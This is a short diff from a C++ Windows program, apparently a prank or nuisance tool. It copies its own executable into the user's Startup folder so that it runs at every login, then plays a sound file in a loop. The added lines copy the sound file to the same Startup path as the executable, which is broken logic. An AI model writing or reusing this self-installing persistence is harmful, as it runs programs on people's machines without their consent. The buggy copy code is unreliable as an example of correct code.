@@ -15,7 +15,9 @@ int main(void)
      int counter = 15;
      std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe";
      std::string filename = "main.exe";
+     std::string sound = "FX9eEhoRZhY.wav";
      CopyFile(filename.c_str(), startup.c_str(),true);
+     CopyFile(sound.c_str(), startup.c_str(),true);
      PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);
 
      while (counter >= 1)
